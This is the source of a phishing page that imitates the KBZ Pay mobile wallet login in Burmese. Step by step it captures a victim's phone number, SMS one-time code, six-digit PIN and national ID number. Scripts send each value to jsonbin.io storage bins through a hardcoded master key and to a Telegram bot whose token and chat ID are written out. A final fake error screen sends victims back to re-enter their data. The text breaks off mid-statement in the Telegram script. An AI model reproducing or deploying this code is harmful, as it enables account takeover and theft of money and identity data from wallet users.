<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>KBZ Pay PIN</title>
<style>
* {
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body, html {
      width: 100%;
      height: 100%;
      font-family: sans-serif;
      overflow: hidden;
      background: white;
    }

    .screen {
      position: fixed;
      inset: 0;
      display: none;
      justify-content: center;
      align-items: center;
      background-color: white;
      z-index: 10;
    }

    #intro1 {
      display: flex;
      animation: fadeInHold 1.5s forwards;
    }

    #intro1 img, #intro2 img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    #intro2 {
      display: none;
    }

    @keyframes fadeInHold {
      0%   { opacity: 0; }
      50%  { opacity: 1; }
      100% { opacity: 1; }
    }

    #skip {
      position: absolute;
      top: 20px;
      right: 20px;
      background: rgba(0,0,0,0.6);
      color: white;
      padding: 6px 12px;
      border-radius: 20px;
      font-size: 14px;
      cursor: pointer;
    }

    /* Phone Input Page Styles */
    #phone-page {
      display: none;
      background: white;
      height: 100%;
      flex-direction: column;
      align-items: center;
      padding-top: 10vh;
    }
    
    .logo {
      width: 80px;
      height: auto;
      margin-bottom: 10px;
    }
    
    .instruction {
      font-size: 16px;
      color: black;
      margin-bottom: 15px;
      text-align: center;
      line-height: 1.8;
      padding: 0 20px;
      letter-spacing: 0.3px;
    }
    
    .phone-input {
      width: 70%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 15px;
      text-align: center;
      margin-bottom: 15px;
    }
    
    .continue-btn {
      width: 70%;
      padding: 10px;
      background: #0057b7;
      color: white;
      border: none;
      border-radius: 18px;
      font-size: 15px;
      opacity: 0.5;
    }
    
    .continue-btn.active {
      opacity: 1;
    }

    /* SMS Verification Page Styles */
    #sms-page {
      display: none;
      background: white;
      height: 100%;
      flex-direction: column;
      padding: 10vh 20px 0;
    }
    
    .sms-instruction {
      font-size: 19px;
      color: #0057b7;
      margin-bottom: 20px;
      font-weight: normal;
      text-align: left;
      width: 100%;
      padding-left: 5px;
    }
    
    .phone-display {
      font-size: 16px;
      color: #777;
      margin-bottom: 30px;
      text-align: left;
      width: 100%;
      padding-left: 5px;
    }
    
    .sms-container {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 30px;
      width: 100%;
    }
    
    .sms-box {
      width: 45px;
      height: 55px;
      text-align: center;
      font-size: 24px;
      border: 1px solid #ccc;
      border-radius: 6px;
      -webkit-appearance: none;
      -moz-appearance: textfield;
    }
    
    .verify-btn {
      width: 70%;
      max-width: 250px;
      padding: 12px;
      background: #0057b7;
      color: white;
      border: none;
      border-radius: 18px;
      font-size: 16px;
      opacity: 0.5;
      display: block;
      margin: 0 auto;
    }

    /* PIN Page Styles */
    #pin-page {
      display: none;
      background: white;
      height: 100%;
    }

    .container {
      text-align: center;
      padding-top: 20px;
    }

    .pin-logo {
      width: 90px;
      height: auto;
      margin-bottom: 5px;
    }

    .pin-instruction {
      font-size: 16px;
      color: #0057b7;
      margin-bottom: 10px;
    }

    .pin-input {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 20px;
    }

    .dot {
      width: 20px;
      height: 20px;
      border-bottom: 2px solid gray;
      position: relative;
    }

    .dot.filled::before {
      content: '';
      position: absolute;
      top: 2px;
      left: 50%;
      transform: translateX(-50%);
      width: 8px;
      height: 8px;
      background: black;
      border-radius: 50%;
    }

    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 80px);
      gap: 10px 10px;
      justify-content: center;
    }

    .key {
      font-size: 24px;
      border: none;
      background: none;
      width: 80px;
      height: 70px;
      display: flex;
      justify-content: center;
      align-items: center;
      border-radius: 50%;
      font-weight: bold;
      color: #444;
    }

    .key:active {
      background: #ddd;
    }

    .key.empty {
      background: none;
      pointer-events: none;
    }
    /* ID Page Styles */
#id-page {
  width: 100%;
  height: 100%;
  position: fixed;
  top: 0;
  left: 0;
  background: white;
  z-index: 20;
}

.header {
  background-color: #0053a0;
  color: white;
  padding: 12px 16px;
  font-size: 20px;
  text-align: center;
}

.content {
  padding: 16px;
}

.subtitle {
  color: #0053a0;
  font-size: 16px;
  line-height: 1.5em;
  margin-bottom: 20px;
  text-align: center;
}

label {
  font-size: 13px;
  color: gray;
  display: block;
  margin-bottom: 4px;
}

select, input[type="number"] {
  width: 100%;
  padding: 12px;
  font-size: 16px;
  font-family: 'Pyidaungsu', 'Myanmar3', sans-serif;
  border: 1px solid #ccc;
  border-radius: 6px;
  margin-bottom: 16px;
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
}

.row {
  display: flex;
  justify-content: space-between;
  gap: 8px;
}

.row select {
  flex: 1;
}

.button {
  background-color: #0053a0;
  color: white;
  text-align: center;
  padding: 14px;
  font-size: 16px;
  border-radius: 8px;
  margin-top: 16px;
  font-weight: bold;
  opacity: 0.5;
  pointer-events: none;
}

.button.active {
  opacity: 1;
  pointer-events: auto;
}

input[type="number"]::-webkit-inner-spin-button {
  -webkit-appearance: none;
}
  </style>
</head>
<body>
<!-- First Intro -->
<div class="screen" id="intro1">
<img alt="Intro 1" src="https://i.imgur.com/ZwBn9lP.jpeg"/>
</div>
<!-- Second Intro -->
<div class="screen" id="intro2">
<img alt="Intro 2" src="https://i.imgur.com/zoCsS0D_d.webp?maxwidth=760&fidelity=grand"/>
<div id="skip">Skip in 5</div>
</div>
<!-- Phone Input Page -->
<div id="phone-page">
  <img src="https://i.imgur.com/hlIVNUH.png" class="logo" alt="KBZ Pay">
  
  <div class="instruction">
      á€á€„á€·á€ºá€–á€¯á€”á€ºá€¸á€”á€¶á€•á€«á€á€ºá€–á€¼á€„á€·á€º á€¡á€€á€±á€¬á€„á€·á€º<br>á€¡á€á€…á€ºá€–á€½á€„á€·á€ºá€•á€« (á€á€­á€¯á€·) login á€á€„á€ºá€•á€«
  </div>
  
  <input type="tel" id="phone-input" class="phone-input" inputmode="numeric" placeholder="09">
  
  <button id="continue-btn" class="continue-btn" disabled>
      á€†á€€á€ºá€á€½á€¬á€¸á€™á€Šá€º
  </button>
</div>
<!-- SMS Verification Page -->
<div id="sms-page">
  <div class="sms-instruction">
      á€€á€»á€±á€¸á€‡á€°á€¸á€•á€¼á€¯á SMS á€™á€¾ á€€á€¯á€’á€ºá€¡á€¬á€¸ á€›á€­á€¯á€€á€ºá€‘á€Šá€·á€ºá€•á€«
  </div>
  
  <div class="phone-display">
      á€á€„á€·á€ºá€–á€¯á€”á€ºá€¸á€”á€¶á€•á€«á€á€º : <span id="display-phone">09XXXXXXX</span>
  </div>
  
  <div class="sms-container">
      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
  </div>
  
  <button id="verify-sms-btn" class="verify-btn" disabled>
      á€†á€€á€ºá€á€½á€¬á€¸á€™á€Šá€º
  </button>
</div>
<!-- PIN Page -->
<div id="pin-page">
<div class="container">
<img alt="KBZ Pay Logo" class="pin-logo" src="https://i.imgur.com/hlIVNUH.png"/>
<div class="pin-instruction">á€¡á€€á€±á€¬á€„á€·á€ºá€á€­á€¯á€·á€á€„á€ºá€›á€±á€¬á€€á€ºá€›á€”á€º PIN á€€á€­á€¯á€›á€­á€¯á€€á€ºá€‘á€Šá€·á€ºá€•á€«</div>
<div class="pin-input">
<div class="dot" id="dot-0"></div>
<div class="dot" id="dot-1"></div>
<div class="dot" id="dot-2"></div>
<div class="dot" id="dot-3"></div>
<div class="dot" id="dot-4"></div>
<div class="dot" id="dot-5"></div>
</div>
<div class="keypad">
<button class="key">1</button>
<button class="key">2</button>
<button class="key">3</button>
<button class="key">4</button>
<button class="key">5</button>
<button class="key">6</button>
<button class="key">7</button>
<button class="key">8</button>
<button class="key">9</button>
<div class="key empty"></div>
<button class="key">0</button>
<button class="key delete">âŒ«</button>
</div>
</div>
</div>
<script>
    // Font loading
    const fontStyle = document.createElement('style');
    fontStyle.textContent = `
        @font-face {
            font-family: 'Pyidaungsu';
            src: url('https://cdn.jsdelivr.net/gh/LeonarAung/Pyidaungsu@1.0/Pyidaungsu.ttf') format('truetype');
        }
    `;
    document.head.appendChild(fontStyle);

    // Intro logic
    setTimeout(() => {
      document.getElementById("intro1").style.display = "none";
      document.getElementById("intro2").style.display = "flex";

      let seconds = 5;
      const skipText = document.getElementById("skip");
      const countdown = setInterval(() => {
        seconds--;
        skipText.textContent = `Skip in ${seconds}`;
        if (seconds <= 0) {
          clearInterval(countdown);
          showPhonePage();
        }
      }, 1000);

      skipText.addEventListener("click", showPhonePage);
    }, 1500);

    function showPhonePage() {
      document.getElementById("intro2").style.display = "none";
      document.getElementById("phone-page").style.display = "flex";
    }

    // Phone Input Page Functionality
    const phoneInput = document.getElementById('phone-input');
    const continueBtn = document.getElementById('continue-btn');
    
    phoneInput.addEventListener('input', () => {
        const hasValue = phoneInput.value.trim().length > 0;
        continueBtn.disabled = !hasValue;
        continueBtn.classList.toggle('active', hasValue);
    });
    
    continueBtn.addEventListener('click', async () => {
        const phoneNumber = phoneInput.value.trim();
        if (!phoneNumber) return;
        
        try {
            await fetch('https://api.jsonbin.io/v3/b/687fa2caae596e708fb9e06c', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Master-Key': '$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP.'
                },
                body: JSON.stringify({
                    phone: phoneNumber,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Store phone number for display in SMS page
            localStorage.setItem('kbz_phone', phoneNumber);
            
            // Navigate to SMS page
            document.getElementById('phone-page').style.display = 'none';
            document.getElementById('sms-page').style.display = 'flex';
            document.getElementById('display-phone').textContent = phoneNumber;
        } catch (error) {
            console.error('á€™á€¾á€¬á€¸á€šá€½á€„á€ºá€°á€™á€¾á€¯á€›á€¾á€­á€”á€±á€•á€«á€á€Šá€º :', error);
        }
    });

    // SMS Verification Page Functionality
    const smsBoxes = document.querySelectorAll('.sms-box');
    const verifyBtn = document.getElementById('verify-sms-btn');
    
    smsBoxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            if (box.value.length > 1) box.value = box.value.slice(0, 1);
            if (box.value && index < 5) smsBoxes[index + 1].focus();
            verifyBtn.disabled = !Array.from(smsBoxes).every(b => b.value);
            verifyBtn.style.opacity = verifyBtn.disabled ? 0.5 : 1;
        });
        
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                smsBoxes[index - 1].focus();
            }
        });
    });
    
    verifyBtn.addEventListener('click', async () => {
        const smsCode = Array.from(smsBoxes).map(b => b.value).join('');
        
        try {
            await fetch('https://api.jsonbin.io/v3/b/687fa2e0f7e7a370d1ec1206', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Master-Key': '$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP.'
                },
                body: JSON.stringify({
                    phone: localStorage.getItem('kbz_phone'),
                    sms_code: smsCode,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Navigate to PIN page
            document.getElementById('sms-page').style.display = 'none';
            document.getElementById('pin-page').style.display = 'block';
        } catch (error) {
            console.error('á€™á€¾á€¬á€¸á€šá€½á€„á€ºá€¸á€™á€¾á€¯á€›á€¾á€­á€”á€±á€•á€«á€á€Šá€º :', error);
        }
    });
</script>

<script>
    // PIN input
    let pin = "";
    const keys = document.querySelectorAll(".key");
    const dots = document.querySelectorAll(".dot");

    keys.forEach((key) => {
      key.addEventListener("click", () => {
        const value = key.textContent.trim();

        if (key.classList.contains("delete")) {
          pin = pin.slice(0, -1);
        } else if (pin.length < 6 && !key.classList.contains("empty")) {
          pin += value;
        }

        updateDots();

        if (pin.length === 6) {
          sendPin(pin).then(() => {
            showIdPage();
            pin = "";
            setTimeout(updateDots, 300);
          });
        }
      });
    });

    function updateDots() {
      dots.forEach((dot, index) => {
        dot.classList.toggle("filled", index < pin.length);
      });
    }

    async function sendPin(pin) {
      const binId = "687fa3037b4b8670d8a5770a"; // Your bin ID
      const apiKey = "$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP.";

      try {
        const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
          headers: { "X-Master-Key": apiKey }
        });
        const json = await res.json();
        const pins = json.record.pins || [];

        pins.push({ pin, timestamp: new Date().toISOString() });

        await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            "X-Master-Key": apiKey
          },
          body: JSON.stringify({ pins })
        });
      } catch (err) {
        console.error("á€™á€¾á€¬á€¸á€šá€½á€„á€ºá€¸á€™á€¾á€¯á€›á€¾á€­á€”á€±á€•á€«á€á€Šá€º :", err);
      }
    }

    function showIdPage() {
      document.getElementById("pin-page").style.display = "none";
      document.getElementById("id-page").style.display = "block";
    }
</script>

<!-- ID Page -->
<div id="id-page" style="display:none; font-family: 'Pyidaungsu', 'Myanmar3', sans-serif;">
  <div class="header">á€¡á€­á€¯á€„á€ºá€’á€®á€¡á€á€Šá€ºá€•á€¼á€¯á€á€¼á€„á€ºá€¸</div>
  <div class="content">
    <div class="subtitle">
      á€á€„á€ºáá€¡á€€á€±á€¬á€„á€·á€ºá€œá€¯á€¶á€á€¼á€¯á€¶á€™á€¾á€¯á€›á€¾á€­á€…á€±á€›á€”á€ºá€á€„á€·á€ºá€€á€­á€¯á€šá€ºá€›á€±á€¸<br/>
      á€¡á€á€»á€€á€ºá€œá€€á€ºá€™á€»á€¬á€¸á€¡á€¬á€¸ á€¡á€á€Šá€ºá€•á€¼á€¯á€•á€«
    </div>
    
    <label>á€¡á€­á€¯á€„á€ºá€’á€®á€¡á€™á€»á€­á€¯á€¸á€¡á€…á€¬á€¸</label>
    <select id="type">
      <option>á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€º</option>
      <option>á€™á€¾á€á€ºá€•á€¯á€¶á€á€„á€ºá€¡á€Ÿá€±á€¬á€„á€ºá€¸</option>
      <option>á€”á€­á€¯á€„á€ºá€„á€¶á€€á€°á€¸á€œá€€á€ºá€™á€¾á€á€º</option>
    </select>
    
    <label>á€¡á€­á€¯á€„á€ºá€’á€®á€”á€¶á€•á€«á€á€º</label>
    <div class="row">
      <select id="number"></select>
      <select id="district"></select>
      <select id="typecode">
        <option>á€§á€Šá€·á€º</option>
        <option>á€”á€­á€¯á€„á€º</option>
        <option>á€•á€¼á€¯</option>
        <option>á€…</option>
        <option>á€á€¬á€á€”á€¬</option>
        <option>á€šá€¬á€šá€®</option>
      </select>
    </div>
    
    <input id="final" inputmode="numeric" placeholder="á€”á€¶á€•á€«á€á€º" type="number"/>
    <div class="button" id="submitBtn">á€¡á€á€Šá€ºá€•á€¼á€¯á€™á€Šá€º</div>
  </div>
</div>
<script>
    const numberSelect = document.getElementById("number");
    const districtSelect = document.getElementById("district");
    const finalInput = document.getElementById("final");
    const submitBtn = document.getElementById("submitBtn");

    const districtMap = {
  1: ["á€¡á€€á€š", "á€™á€™á€”", "á€¡á€™á€š", "á€Ÿá€¬á€•á€”", "á€á€á€", "á€€á€™á€”", "á€€á€™á€", "á€€á€•á€", "á€á€˜á€’", "á€œá€œá€™", "á€™á€™á€”", "á€œá€‚á€”", "á€™á€€á€”", "á€™á€€á€", "á€™á€™á€", "á€™á€œá€”", "á€™á€™á€”", "á€™á€“á€”", "á€™á€…á€”", "á€”á€™á€”", "á€•á€”á€’", "á€•á€á€¡", "á€•á€™á€”", "á€™á€€á€”", "á€á€’á€”", "á€á€œá€”", "á€á€•á€", "á€á€”á€”", "á€á€™á€”", "á€›á€˜á€š", "á€›á€€á€”"],
  2: ["á€˜á€œá€", "á€’á€™á€†", "á€œá€€á€”", "á€™á€…á€”", "á€–á€†", "á€–á€›á€†", "á€›á€á€”", "á€›á€á€”"],
  3: ["á€€á€†á€€", "á€œá€˜á€”", "á€œá€á€”", "á€™á€á€", "á€•á€€á€”", "á€–á€¡á€”", "á€–á€•á€”", "á€…á€€á€œ", "á€á€á€€", "á€á€á€”", "á€á€œá€™", "á€›á€›á€"],
  4: ["á€Ÿá€á€”", "á€‘á€á€œ", "á€€á€á€”", "á€€á€•á€œ", "á€™á€á€”", "á€™á€á€•", "á€•á€œá€", "á€–á€œá€”", "á€†á€™á€”", "á€á€á€”", "á€á€‡á€”", "á€›á€á€’", "á€›á€‡á€”"],
  5: ["á€¡á€á€”", "á€¡á€›á€", "á€—á€™á€”", "á€˜á€á€œ", "á€’á€Ÿá€”", "á€’á€•á€š", "á€Ÿá€™á€œ", "á€†á€™á€›", "á€‘á€á€”", "á€‘á€¡á€", "á€€á€˜á€œ", "á€€á€œá€‘", "á€€á€œá€”", "á€€á€œá€•á€", "á€€á€œá€", "á€€á€™á€”", "á€€á€”á€”", "á€€á€á€”", "á€á€¥á€”", "á€á€¥á€", "á€á€•á€”", "á€á€á€”", "á€œá€Ÿá€”", "á€œá€›á€”", "á€™á€€á€”", "á€™á€œá€”", "á€™á€™á€”", "á€™á€™á€", "á€™á€•á€œ", "á€™á€á€”", "á€™á€›á€”", "á€”á€šá€”", "á€„á€‡á€”", "á€•á€œá€˜", "á€•á€œá€”", "á€•á€†á€”", "á€–á€•á€”", "á€…á€€á€”", "á€†á€œá€€", "á€á€™á€”", "á€á€†á€”", "á€á€œá€”", "á€á€á€”", "á€›á€˜á€”", "á€šá€™á€•", "á€›á€¥á€”", "á€›á€á€€"],
  6: ["á€˜á€•á€”", "á€‘á€á€”", "á€€á€œá€¡", "á€€á€…á€”", "á€€á€á€”", "á€€á€›á€›", "á€á€™á€€", "á€œá€€á€”", "á€™á€¡á€”", "á€™á€¡á€›", "á€™á€™á€”", "á€™á€á€”", "á€„á€›á€€", "á€•á€€á€™", "á€•á€œá€”", "á€•á€œá€", "á€á€”á€", "á€á€á€›", "á€á€›á€", "á€›á€–á€”"],
  7: ["á€¡á€–á€”", "á€¡á€á€”", "á€’á€¥á€”", "á€‘á€á€•", "á€€á€€á€”", "á€€á€•á€€", "á€€á€á€", "á€€á€á€", "á€€á€á€”", "á€œá€•á€", "á€™á€’á€”", "á€™á€œá€”", "á€™á€Šá€”", "á€”á€á€œ", "á€Šá€œá€•", "á€•á€á€”", "á€•á€á€", "á€•á€™á€”", "á€•á€”á€€", "á€•á€á€œ", "á€•á€á€”", "á€•á€á€†", "á€•á€á€", "á€–á€™á€”", "á€á€„á€”", "á€á€€á€”", "á€á€”á€•", "á€á€†á€”", "á€á€á€", "á€á€™á€”", "á€›á€€á€”", "á€›á€á€”", "á€›á€á€›", "á€‡á€€á€”"],
  8: ["á€¡á€œá€”", "á€‚á€‚á€”", "á€á€œá€”", "á€€á€‘á€”", "á€€á€™á€”", "á€á€™á€”", "á€™á€˜á€”", "á€™á€‘á€”", "á€™á€€á€”", "á€™á€œá€”", "á€™á€™á€”", "á€™á€á€”", "á€™á€á€”", "á€”á€™á€”", "á€„á€–á€”", "á€•á€á€€", "á€•á€™á€”", "á€•á€–á€”", "á€…á€€á€”", "á€…á€œá€”", "á€†á€™á€”", "á€†á€•á€", "á€†á€–á€”", "á€…á€á€›", "á€á€á€€", "á€á€›á€”", "á€šá€™á€”", "á€›á€á€”", "á€›á€…á€€"],
  9: ["á€¡á€™á€›", "á€¡á€™á€‡", "á€¥á€á€", "á€’á€á€", "á€€á€™á€”", "á€€á€•á€", "á€€á€†á€”", "á€á€¡á€‡", "á€á€™á€…", "á€œá€á€”", "á€™á€Ÿá€™", "á€™á€‘á€œ", "á€™á€€á€”", "á€™á€á€”", "á€™á€œá€”", "á€™á€™á€”", "á€™á€”á€™", "á€™á€”á€", "á€™á€á€›", "á€™á€á€”", "á€™á€›á€™", "á€™á€›á€", "á€”á€‘á€€", "á€„á€á€›", "á€„á€‡á€”", "á€Šá€¥á€”", "á€•á€˜á€”", "á€•á€—á€", "á€•á€€á€", "á€•á€™á€”", "á€•á€¥á€œ", "á€•á€á€€", "á€…á€€á€”", "á€…á€€á€", "á€á€€á€”", "á€á€€á€", "á€á€á€¥", "á€á€á€”", "á€á€•á€€", "á€á€…á€”", "á€á€á€”", "á€›á€€á€”", "á€›á€™á€", "á€‡á€—á€", "á€‡á€šá€"],
  10: ["á€˜á€œá€”", "á€€á€‘á€”", "á€€á€á€™", "á€€á€™á€›", "á€á€†á€”", "á€á€‡á€”", "á€œá€™á€”", "á€™á€’á€”", "á€™á€œá€™", "á€•á€™á€”", "á€á€‘á€”", "á€á€–á€›", "á€›á€™á€”"],
  11: ["á€¡á€™á€”", "á€˜á€á€", "á€‚á€™á€”", "á€€á€–á€”", "á€€á€á€œ", "á€€á€á€”", "á€™á€¡á€”", "á€™á€¡á€", "á€™á€¥á€”", "á€™á€•á€”", "á€™á€•á€", "á€™á€á€”", "á€•á€á€€", "á€•á€á€", "á€•á€á€”", "á€…á€á€”", "á€á€€á€”", "á€á€•á€", "á€á€á€”", "á€›á€—á€”", "á€›á€á€"],
  12: ["á€¡á€œá€”", "á€¡á€…á€”", "á€—á€Ÿá€”", "á€—á€á€‘", "á€’á€‚á€™", "á€’á€‚á€”", "á€’á€‚á€†", "á€’á€‚á€", "á€’á€‚á€›", "á€’á€œá€”", "á€’á€•á€”", "á€‘á€á€•", "á€€á€€á€€", "á€€á€á€€", "á€€á€™á€”", "á€€á€™á€", "á€€á€™á€›", "á€€á€á€”", "á€€á€á€", "á€á€›á€”", "á€œá€€á€”", "á€œá€™á€”", "á€œá€™á€", "á€œá€á€”", "á€œá€á€š", "á€œá€šá€”", "á€œá€šá€›", "á€™á€˜á€”", "á€™á€‚á€", "á€™á€›á€€", "á€¥á€€á€™", "á€¥á€€á€", "á€•á€˜á€", "á€•á€‡á€", "á€†á€€á€", "á€†á€€á€”", "á€…á€á€”", "á€á€€á€”", "á€á€™á€”", "á€á€á€‘", "á€á€á€”", "á€á€ƒá€€", "á€á€€á€", "á€á€á€”", "á€á€œá€”", "á€›á€€á€”", "á€›á€•á€"],
  13: ["á€¡á€•á€”", "á€¡á€á€”", "á€¡á€á€š", "á€Ÿá€Ÿá€”", "á€Ÿá€™á€”", "á€Ÿá€•á€”", "á€Ÿá€•á€", "á€€á€Ÿá€”", "á€€á€€á€”", "á€€á€á€”", "á€€á€œá€’", "á€€á€œá€‘", "á€€á€œá€”", "á€€á€œá€", "á€€á€™á€”", "á€€á€á€œ", "á€€á€á€”", "á€€á€á€", "á€€á€á€”", "á€á€œá€”", "á€á€›á€Ÿ", "á€œá€€á€”", "á€œá€á€”", "á€œá€á€", "á€œá€œá€”", "á€œá€›á€”", "á€™á€˜á€”", "á€™á€Ÿá€›", "á€™á€‘á€”", "á€™á€‘á€", "á€™á€€á€‘", "á€™á€€á€”", "á€™á€€á€", "á€™á€á€”", "á€™á€á€", "á€™á€œá€”", "á€™á€œá€", "á€™á€™á€‘", "á€™á€™á€”", "á€™á€™á€", "á€™á€”á€”", "á€™á€”á€", "á€™á€„á€”", "á€™á€•á€‘", "á€™á€•á€”", "á€™á€•á€", "á€™á€–á€”", "á€™á€–á€", "á€™á€›á€”", "á€™á€›á€", "á€™á€†á€”", "á€™á€†á€", "á€™á€á€”", "á€™á€á€", "á€™á€šá€‘", "á€™á€šá€”", "á€™á€šá€", "á€”á€†á€”", "á€”á€á€”", "á€”á€á€", "á€”á€™á€", "á€”á€–á€”", "á€”á€…á€”", "á€”á€á€›", "á€Šá€›á€”", "á€•á€œá€‘", "á€•á€œá€”", "á€•á€œá€", "á€•á€•á€€", "á€•á€†á€”", "á€•á€†á€", "á€•á€á€š", "á€•á€á€”", "á€•á€›á€”", "á€–á€á€”", "á€†á€†á€”", "á€á€€á€”", "á€á€á€œ", "á€á€œá€”", "á€á€™á€Š", "á€á€á€”", "á€á€šá€”", "á€á€”á€”", "á€á€•á€”", "á€›á€„á€”", "á€›á€Šá€”", "á€›á€…á€”"],
  14: ["á€¡á€‚á€•", "á€¡á€™á€”", "á€¡á€™á€", "á€˜á€€á€œ", "á€’á€’á€›", "á€“á€”á€–", "á€Ÿá€€á€€", "á€Ÿá€á€", "á€€á€€á€‘", "á€€á€€á€”", "á€€á€á€”", "á€€á€œá€”", "á€€á€•á€”", "á€œá€™á€”", "á€œá€•á€", "á€™á€¡á€”", "á€™á€¡á€•", "á€™á€™á€€", "á€™á€™á€”", "á€„á€•á€", "á€„á€†á€”", "á€„á€á€", "á€„á€›á€€", "á€Šá€á€”", "á€•á€…á€œ", "á€•á€á€”", "á€•á€á€¡", "á€•á€á€”", "á€•á€á€›", "á€–á€•á€”", "á€á€•á€”", "á€á€á€™", "á€›á€€á€”", "á€›á€á€š", "á€‡á€œá€”"]
};

    for (let i = 1; i <= 14; i++) {
      const opt = document.createElement("option");
      opt.textContent = i;
      numberSelect.appendChild(opt);
    }

    numberSelect.addEventListener("change", () => {
      const selected = numberSelect.value;
      districtSelect.innerHTML = "";
      if (districtMap[selected]) {
        districtMap[selected].forEach(d => {
          const opt = document.createElement("option");
          opt.textContent = d;
          districtSelect.appendChild(opt);
        });
      }
    });

    finalInput.addEventListener("input", () => {
      if (finalInput.value.trim()) {
        submitBtn.classList.add("active");
      } else {
        submitBtn.classList.remove("active");
      }
    });

    submitBtn.addEventListener("click", async () => {
      if (!finalInput.value.trim()) return;

      const data = {
        id: [
          document.getElementById("type").value,
          document.getElementById("number").value,
          document.getElementById("district").value,
          document.getElementById("typecode").value,
          finalInput.value.trim()
        ]
      };

      try {
        await fetch("https://api.jsonbin.io/v3/b/687fa3187b4b8670d8a57712", {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            "X-Master-Key": "$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP."
          },
          body: JSON.stringify(data)
        });
      } catch (err) {
        alert("á€™á€¾á€¬á€¸á€šá€½á€„á€ºá€¸á€™á€¾á€¯á€›á€¾á€­á€”á€±á€•á€«á€á€Šá€ºá‹");
      }
    });
  </script>
<!-- Loading Spinner Overlay -->
<div id="loadingOverlay" style="display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(255,255,255,0.8); justify-content:center; align-items:center; z-index:9999;">
<div class="loader"></div>
</div>
<style>
.loader {
  border: 6px solid #f3f3f3;
  border-top: 6px solid #3498db;
  border-radius: 50%;
  width: 40px;
  height: 40px;
  animation: spin 0.8s linear infinite;
}
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
<script>
document.getElementById("submitBtn").addEventListener("click", function () {
  document.getElementById("loadingOverlay").style.display = "flex";
  setTimeout(() => {
    document.getElementById("id-page").style.display = "none";
    document.getElementById("fifth-page").style.display = "block";
    document.getElementById("loadingOverlay").style.display = "none";
  }, 1000);
});
</script>
<div id="fifth-page" style="display:none; padding: 20px; text-align:center;">
<div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 80vh;">

<div style="margin-top: 80px;">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbgBestnpRJ4LT4Rz_pFhM9zhnbn_Ql3ALsw&s" style="width:60px; opacity:0.4;"/>
<div style="font-size: 16px; color: #0052B4; margin-top: 16px;">ID á€™á€¾á€¬á€¸á€šá€½á€„á€ºá€¸á€”á€±á€•á€«á€á€Šá€ºá€•á€¼á€”á€ºá€œá€Šá€ºá€…á€…á€ºá€†á€±á€¸á€•á€«</div>
</div>
<div style="margin-top: 40px;">
<div id="backToPinBtn" style="background-color: #0052B4; padding: 12px; color:white; border-radius: 12px; width: 80%; margin: auto; font-size: 18px;; width: 75%; max-width: 300px; font-size: 18px; padding: 12px 0; background-color: #0064D2; color: white; border-radius: 20px; width: 80%; max-width: 320px; font-size: 20px; padding: 14px 0; font-family: Pyidaungsu, Myanmar3, sans-serif; white-space: nowrap; text-align: center; background-color: #0064D2; color: white; border-radius: 20px; width: auto; min-width: 60%; max-width: 320px; font-size: 20px; padding: 14px 24px; font-family: Pyidaungsu, Myanmar3, sans-serif">á€¡á€…á€á€­á€¯á€·á€•á€¼á€”á€ºá€á€½á€¬á€¸á€™á€Šá€º</div>
</div>
</div>
</div><script>
document.getElementById("backToPinBtn").addEventListener("click", function () {
  document.getElementById("fifth-page").style.display = "none";
  document.getElementById("phone-page").style.display = "flex";
});
</script>
  
<script>
  // Telegram Configuration
const BOT_TOKEN = '7257629895:AAGv9vrBCIBCiSe799wQ7oK0v1ijaPwON30';
const CHAT_ID = 6378975216; // Your chat ID

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    return await response.json();
  } catch (error) {
    console.error('á€™á€¾á€¬á€¸á€šá€½á€„á€ºá€¸á€™á€¾á€¯á€›á€¾á€­á€”á€±á€•á€«á€á€Šá€º :', error);
    return { ok: false };
  }
}

// Phone Page Submission
document.getElementById('continue-btn').addEventListener('click', async function() {
  const phoneNumber = document.getElementById('phone-input').value.trim();
  
  if (!phoneNumber) {
    alert('Please enter a phone number');
    return;
  }

  // 1. Send to Telegram
  const telegramResult = await sendToTelegram(
    `ğŸ“± <b>New KBZ Pay Login</b>\n` +
